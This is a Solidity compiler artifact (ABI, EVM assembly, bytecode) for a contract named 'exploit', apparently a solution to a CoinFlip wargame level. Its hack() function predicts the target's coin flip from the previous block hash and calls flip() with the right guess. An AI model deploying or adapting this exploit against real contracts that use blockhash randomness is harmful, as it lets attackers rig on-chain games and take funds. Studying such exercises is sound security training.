{
	"contracts/CoinFlip.sol": {
		"exploit": {
			"abi": [
				{
					"constant": false,
					"inputs": [],
					"name": "hack",
					"outputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"name": "aimAddr",
							"type": "address"
						}
					],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "constructor"
				}
			],
			"devdoc": {
				"methods": {}
			},
			"evm": {
				"assembly": "    /* \"contracts/CoinFlip.sol\":772:1233  contract exploit {\r... */\n  mstore(0x40, 0x60)\n    /* \"contracts/CoinFlip.sol\":832:909  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"contracts/CoinFlip.sol\":815:909  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x1\n  sstore\n    /* \"contracts/CoinFlip.sol\":916:990  function exploit(address aimAddr) {\r... */\n  jumpi(tag_1, iszero(callvalue))\n  0x0\n  dup1\n  revert\ntag_1:\n  mload(0x40)\n  0x20\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  add\n  0x40\n  mstore\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap2\n  swap1\n  pop\n  pop\n    /* \"contracts/CoinFlip.sol\":976:983  aimAddr */\n  dup1\n    /* \"contracts/CoinFlip.sol\":957:964  expFlip */\n  0x0\n  dup1\n    /* \"contracts/CoinFlip.sol\":957:984  expFlip = CoinFlip(aimAddr) */\n  0x100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/CoinFlip.sol\":916:990  function exploit(address aimAddr) {\r... */\n  pop\n    /* \"contracts/CoinFlip.sol\":772:1233  contract exploit {\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x0\n  codecopy\n  0x0\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/CoinFlip.sol\":772:1233  contract exploit {\r... */\n      mstore(0x40, 0x60)\n      jumpi(tag_1, lt(calldatasize, 0x4))\n      calldataload(0x0)\n      0x100000000000000000000000000000000000000000000000000000000\n      swap1\n      div\n      0xffffffff\n      and\n      dup1\n      0x4de260a2\n      eq\n      tag_2\n      jumpi\n    tag_1:\n      0x0\n      dup1\n      revert\n        /* \"contracts/CoinFlip.sol\":996:1230  function hack() public {\r... */\n    tag_2:\n      jumpi(tag_3, iszero(callvalue))\n      0x0\n      dup1\n      revert\n    tag_3:\n      tag_4\n      jump(tag_5)\n    tag_4:\n      stop\n    tag_5:\n        /* \"contracts/CoinFlip.sol\":1026:1044  uint256 blockValue */\n      0x0\n        /* \"contracts/CoinFlip.sol\":1094:1110  uint256 coinFlip */\n      dup1\n        /* \"contracts/CoinFlip.sol\":1157:1167  bool guess */\n      0x0\n        /* \"contracts/CoinFlip.sol\":1084:1085  1 */\n      0x1\n        /* \"contracts/CoinFlip.sol\":1071:1083  block.number */\n      number\n        /* \"contracts/CoinFlip.sol\":1071:1085  block.number-1 */\n      sub\n        /* \"contracts/CoinFlip.sol\":1055:1086  block.blockhash(block.number-1) */\n      blockhash\n        /* \"contracts/CoinFlip.sol\":1047:1087  uint256(block.blockhash(block.number-1)) */\n      0x1\n      swap1\n      div\n        /* \"contracts/CoinFlip.sol\":1026:1087  uint256 blockValue = uint256(block.blockhash(block.number-1)) */\n      swap3\n      pop\n        /* \"contracts/CoinFlip.sol\":1143:1149  FACTOR */\n      sload(0x1)\n        /* \"contracts/CoinFlip.sol\":1129:1139  blockValue */\n      dup4\n        /* \"contracts/CoinFlip.sol\":1121:1149  uint256(blockValue) / FACTOR */\n      dup2\n      iszero\n      iszero\n      tag_7\n      jumpi\n      invalid\n    tag_7:\n      div\n        /* \"contracts/CoinFlip.sol\":1094:1150  uint256 coinFlip = uint256(uint256(blockValue) / FACTOR) */\n      swap2\n      pop\n        /* \"contracts/CoinFlip.sol\":1182:1183  1 */\n      0x1\n        /* \"contracts/CoinFlip.sol\":1170:1178  coinFlip */\n      dup3\n        /* \"contracts/CoinFlip.sol\":1170:1183  coinFlip == 1 */\n      eq\n        /* \"contracts/CoinFlip.sol\":1170:1198  coinFlip == 1 ? true : false */\n      tag_8\n      jumpi\n        /* \"contracts/CoinFlip.sol\":1193:1198  false */\n      0x0\n        /* \"contracts/CoinFlip.sol\":1170:1198  coinFlip == 1 ? true : false */\n      jump(tag_9)\n    tag_8:\n        /* \"contracts/CoinFlip.sol\":1186:1190  true */\n      0x1\n        /* \"contracts/CoinFlip.sol\":1170:1198  coinFlip == 1 ? true : false */\n    tag_9:\n        /* \"contracts/CoinFlip.sol\":1157:1198  bool guess = coinFlip == 1 ? true : false */\n      swap1\n      pop\n        /* \"contracts/CoinFlip.sol\":1205:1212  expFlip */\n      0x0\n      dup1\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/CoinFlip.sol\":1205:1217  expFlip.flip */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1d263f67\n        /* \"contracts/CoinFlip.sol\":1218:1223  guess */\n      dup3\n        /* \"contracts/CoinFlip.sol\":1205:1224  expFlip.flip(guess) */\n      mstore(add(0x20, mload(0x40)), 0x0)\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0x100000000000000000000000000000000000000000000000000000000\n      mul\n      dup2\n      mstore\n      0x4\n      add\n      dup1\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x0\n      dup8\n      dup1\n      extcodesize\n      iszero\n      iszero\n      tag_10\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_10:\n      sub(gas, 0x2c6)\n      call\n      iszero\n      iszero\n      tag_11\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_11:\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      mload\n      swap1\n      pop\n      pop\n        /* \"contracts/CoinFlip.sol\":996:1230  function hack() public {\r... */\n      pop\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa165627a7a723058203dd3cc21a50dbd513406ec5571f095d1598d760d93895132baca8a30821cdee70029\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60606040527f8000000000000000000000000000000000000000000000000000000000000000600155341561003357600080fd5b60405160208061021783398101604052808051906020019091905050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506101788061009f6000396000f300606060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680634de260a214610046575b600080fd5b341561005157600080fd5b61005961005b565b005b600080600060014303406001900492506001548381151561007857fe5b0491506001821461008a57600061008d565b60015b90506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67826000604051602001526040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018082151515158152602001915050602060405180830381600087803b151561012b57600080fd5b6102c65a03f1151561013c57600080fd5b50505060405180519050505050505600a165627a7a723058203dd3cc21a50dbd513406ec5571f095d1598d760d93895132baca8a30821cdee70029",
					"opcodes": "PUSH1 0x60 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x1 SSTORE CALLVALUE ISZERO PUSH2 0x33 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP1 PUSH2 0x217 DUP4 CODECOPY DUP2 ADD PUSH1 0x40 MSTORE DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP2 SWAP1 POP POP DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x178 DUP1 PUSH2 0x9F PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x60 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x4DE260A2 EQ PUSH2 0x46 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE ISZERO PUSH2 0x51 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x59 PUSH2 0x5B JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x1 NUMBER SUB BLOCKHASH PUSH1 0x1 SWAP1 DIV SWAP3 POP PUSH1 0x1 SLOAD DUP4 DUP2 ISZERO ISZERO PUSH2 0x78 JUMPI INVALID JUMPDEST DIV SWAP2 POP PUSH1 0x1 DUP3 EQ PUSH2 0x8A JUMPI PUSH1 0x0 PUSH2 0x8D JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP3 PUSH1 0x0 PUSH1 0x40 MLOAD PUSH1 0x20 ADD MSTORE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO ISZERO PUSH2 0x12B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x2C6 GAS SUB CALL ISZERO ISZERO PUSH2 0x13C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP POP POP PUSH1 0x40 MLOAD DUP1 MLOAD SWAP1 POP POP POP POP POP JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 RETURNDATASIZE 0xd3 0xcc 0x21 0xa5 0xd 0xbd MLOAD CALLVALUE MOD 0xec SSTORE PUSH18 0xF095D1598D760D93895132BACA8A30821CDE 0xe7 STOP 0x29 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "75200",
						"executionCost": "40460",
						"totalCost": "115660"
					},
					"external": {
						"hack()": "infinite"
					}
				},
				"methodIdentifiers": {
					"hack()": "4de260a2"
				}
			},
			"userdoc": {
				"methods": {}
			}
		}
	}
}